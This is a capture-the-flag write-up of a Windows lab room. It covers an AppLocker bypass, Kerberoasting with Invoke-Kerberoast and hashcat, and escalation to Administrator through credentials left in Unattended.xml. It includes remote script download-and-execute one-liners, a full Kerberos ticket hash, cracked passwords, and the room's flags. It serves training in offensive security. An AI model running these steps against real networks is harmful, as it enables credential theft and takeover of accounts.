# Task 1  Deploy the Windows machine
In this room you will learn the following:

Windows Forensics
Basics of kerberoasting
AV Evading
Applocker
Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

Answer the questions below
Deploy the windows machine, you will be able to control this in your browser. However if you prefer to use your own RDP client, the credentials are below.

Username: `corp\dark`
Password: `_QuejVudId6`

# Task 2  Bypassing Applocker

AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.

You will have noticed with the deployed machine, you are unable to execute your own binaries and certain functions on the system will be restricted.

Answer the questions below
There are many ways to bypass AppLocker.

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default. 

## Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.

> No answer needed

Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

## Access the file and and obtain the flag.

Please see historyfile.

> flag{a12a41b5f8111327690f836e9b302f0b}

# Task 3  Kerberoasting

It is important you understand how Kerberous actually works in order to know how to exploit it. Watch the video below.

Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!

Answer the questions below
Lets first enumerate Windows. If we run `setspn -T medin -Q ​ */*` we can extract all accounts in the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

## Running that command, we find an existing SPN. What user is that for?

> fela

### Doing

```powershell
PS C:\Windows\System32\spool\drivers\color> setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!
```

Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

Lets first get the Powershell Invoke-Kerberoast script.

`iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')`

Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl

## You should get a SPN ticket.

> No answer needed

Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

`hashcat -m 13100 -​a 0 hash.txt wordlist --force`

## Crack the hash. What is the users password in plain text?

> rubenF124

### Hashcat Output

```text
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 10 secs

$krb5tgs$23$*fela$corp.local$HTTP/fela*$70d6ca709daa0610c1a817e2516a92e7$c1c91ee25dbe951275b9a66d32b1130c932cffd62adbcebaee8d79f296e9153a7039e9b3cf69b3b111035abd71feb20eb6e4e9657133be8f3b7bbd307b00b1081f33a8996c8f7110cf8dad1fbe1a859db51ac0c9382d868fce03ed3c6143b29097b59faa916935a667742187984a6152de8854f3ed71f1dd7c65b849055fe7d518babf2bda12d704c44e7ae7dec962cd5b4cad499cbe9aa074de708c12bfd623e6685415fea901bbccc3cae951ab17b36c7b38e979a09f62fb74a46f6ac48a2c639ffa28cb55e12987c6cd9e5168d43e1305ba2eaed4ae944ea8ac4e19ef9b19e472754ab3319f9510358f1b401516da8d452f9fca7515d684a7bba668516b037b23b542fb6ab4d9d061a93353e87b82b83dffcf8a41f8e7811a4ca99f7cfb7384be1c653fba6954fc5819822e5e0967dcdd06452afc30a8b3b9fae841389f7069f24ca8e0fc936a5eb72d86c59595c06ad82b7f025fd5639075519b04d43ab1742c116d4c85cce73b2c1159f23d8a225238a5c987c9344b439c619fb43fda8a1406831445c685e4086b24e6c544ac70c2b8594ae9d4a5165eda42711568dbe1b400d922b062fbf656e2b874128f57c64a282586d6eb5b5f71c1d9b4275866db56d4d321fd862d5fc12092189698dcee26a002d48240f6e107ce4f30efb50680cc030c63f0d6de7a5010eee264957cfd57b28bb7687ed2b8477fd05fb10693802aeeb1b22340f83d8535848a1ab9e53c135bb0106a2f210bdcaa1b2698f0e06976aa2fb6a44e8fe21a1bfa422ee75534bfc3e49d82ebf04691b48bd31a8f85599e467bd2701ee2b620a66512a7daab2e43f19ff1bf4d5b8dda70a804e1c9dac25e18a72844e0f1d94ad152955f696982ac5ca166a5d6ce2cac84216a9d0b5d2717d3c2795bb934c3d0b28e24649ed2ffe359ad7a25e115138c4514a4fddb460038b35bb434aaf7dfcdc06bc2549053f1ccdf1f03c3a24a89d5c12bf9d192935f20a23d7e0819a6988491cc0a894a4764a1bf0e2437614c66482ff0cb92bc5fba1a616053aec151705271306e3840eacefe75d8a9ad8e28ec0474dbe9d50217a6ae0a1303b445049118f349fbde05ad64f8323fea53a4a559a3380bb2595160f8e82f00749ee0b13682bb42d092dc753e78d2796a2709177a27eb123d189aca48faf3c493b14377b3acc440da7fd9ce2f76e182a3ddf37eea9d11ca455dc1dd04c1077f4dcf8fa061e87c854edcaf37fd8469556abe1913942649bee079638bfa678b0052135adae411ac542b1435c75a264e837ffec3459076ea0e0ce5dcdd4f7a7c9f65c7453eacbbc76f9ff0557dcece1580871646d1fa3b0426abfd058631584118678c67c2d23b878fca64b5e9bdb7b680f01db221276cb13a68481f688f6b:rubenF124
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTP/fela*$70d6ca709da...688f6b
Time.Started.....: Fri Jan 21 11:49:46 2022, (12 secs)
Time.Estimated...: Fri Jan 21 11:49:58 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   355.5 kH/s (5.69ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4132864/14344384 (28.81%)
Rejected.........: 0/4132864 (0.00%)
Restore.Point....: 4128768/14344384 (28.78%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ruddqoo -> ruben5277

Started: Fri Jan 21 11:49:19 2022
Stopped: Fri Jan 21 11:49:59 2022
```

## Login as this user. What is his flag?

> flag{bde1642535aa396d2439d86fe54a36e4}

# Task 4  Privilege Escalation

We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.

Answer the questions below
We will run PowerUp.ps1 for the enumeration.

Lets load PowerUp1.ps1 into memory.

`iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') `

The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.

"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it here.

It is also where users passwords are stored in base64. Navigate to `C:\Windows\Panther\Unattend\Unattended.xml`.

> Content of unattended File

```text
PS C:\Windows\System32\spool\drivers\color> type C:\Windows\Panther\Unattend\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```
> Decoding
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ="))
```

## What is the decoded password?

> tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T

### Doing

Load the PowerUp.ps1 in (`. .\PowerUp.ps1`) and use command `Invoke-AllChecks`

## Now we have the Administrator's password, login as them and obtain the last flag.

When I try to login, I have to change the password for the `Administrator`

> THM{g00d_j0b_SYS4DM1n_M4s73R}



